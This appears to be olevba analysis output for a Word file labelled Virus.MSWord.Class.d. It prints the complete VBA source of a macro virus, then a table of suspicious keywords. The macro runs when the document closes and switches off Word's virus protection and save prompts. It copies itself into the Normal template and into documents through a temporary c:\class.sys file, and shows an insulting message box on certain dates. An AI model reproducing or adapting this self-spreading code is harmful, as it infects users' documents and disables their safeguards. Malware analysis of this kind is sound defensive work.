olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.d-c5373caa74228e2496b75ebf1ccdb48cea95fcfe
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.d-c5373caa74228e2496b75ebf1ccdb48cea95fcfe - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'Costin Raiu8/3/99 11:26:56 PMGOAT97-1
On Error GoTo out
'Costin Raiu8/3/99 11:26:56 PMGOAT97-1
Options.VirusProtection = False
'Costin Raiu8/3/99 11:26:56 PMGOAT97-1
Options.SaveNormalPrompt = False
'Costin Raiu8/3/99 11:26:56 PMGOAT97-1
Options.ConfirmConversions = False
'Costin Raiu8/3/99 11:26:56 PMGOAT97-1
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Costin Raiu8/3/99 11:26:56 PMGOAT97-1
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Costin Raiu8/3/99 11:26:56 PMGOAT97-1
If nt > 70 And ad > 0 Then GoTo out
'Costin Raiu8/3/99 11:26:56 PMGOAT97-1
If nt < 70 Then
'Costin Raiu8/3/99 11:26:56 PMGOAT97-1
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Costin Raiu8/3/99 11:26:56 PMGOAT97-1
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Costin Raiu8/3/99 11:26:56 PMGOAT97-1
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Costin Raiu8/3/99 11:26:56 PMGOAT97-1
End If
'Costin Raiu8/3/99 11:26:56 PMGOAT97-1
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Costin Raiu8/3/99 11:26:56 PMGOAT97-1
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
'Costin Raiu8/3/99 11:26:56 PMGOAT97-1
host.codemodule.AddFromFile ("c:\class.sys")
'Costin Raiu8/3/99 11:26:56 PMGOAT97-1
With host.codemodule
'Costin Raiu8/3/99 11:26:56 PMGOAT97-1
    For x = 1 To 4
'Costin Raiu8/3/99 11:26:56 PMGOAT97-1
    .deletelines 1
'Costin Raiu8/3/99 11:26:56 PMGOAT97-1
    Next x
'Costin Raiu8/3/99 11:26:56 PMGOAT97-1
End With
'Costin Raiu8/3/99 11:26:56 PMGOAT97-1
If nt < 70 Then
'Costin Raiu8/3/99 11:26:56 PMGOAT97-1
    With host.codemodule
'Costin Raiu8/3/99 11:26:56 PMGOAT97-1
    .replaceline 1, "Sub AutoClose()"
'Costin Raiu8/3/99 11:26:56 PMGOAT97-1
    .replaceline 91, "Sub ToolsMacro()"
'Costin Raiu8/3/99 11:26:56 PMGOAT97-1
    For x = 70 To 81
'Costin Raiu8/3/99 11:26:56 PMGOAT97-1
        .deletelines 62
'Costin Raiu8/3/99 11:26:56 PMGOAT97-1
    Next x
'Costin Raiu8/3/99 11:26:56 PMGOAT97-1
    .replaceline 35, "    For x = 1 To 4"
'Costin Raiu8/3/99 11:26:56 PMGOAT97-1
    End With
'Costin Raiu8/3/99 11:26:56 PMGOAT97-1
End If
'Costin Raiu8/3/99 11:26:56 PMGOAT97-1
With host.codemodule
'Costin Raiu8/3/99 11:26:56 PMGOAT97-1
    For x = 2 To 104 Step 2
'Costin Raiu8/3/99 11:26:56 PMGOAT97-1
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Costin Raiu8/3/99 11:26:56 PMGOAT97-1
    Next x
'Costin Raiu8/3/99 11:26:56 PMGOAT97-1
End With
'Costin Raiu8/3/99 11:26:56 PMGOAT97-1
out:
'Costin Raiu8/3/99 11:26:56 PMGOAT97-1
Rem If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Costin Raiu8/3/99 11:26:56 PMGOAT97-1
End Sub
'Costin Raiu8/3/99 11:26:56 PMGOAT97-1
Sub ToolsMacro()
'Costin Raiu8/3/99 11:26:56 PMGOAT97-1
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
